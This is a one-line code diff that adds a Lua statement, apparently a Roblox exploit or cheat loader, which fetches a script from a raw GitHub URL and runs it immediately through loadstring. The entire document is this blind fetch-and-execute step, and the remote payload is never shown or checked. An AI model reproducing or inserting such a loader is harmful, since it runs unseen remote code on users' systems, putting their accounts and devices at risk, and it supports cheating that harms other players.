@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam3-0op7wdrqg0gl0w.lua"))()
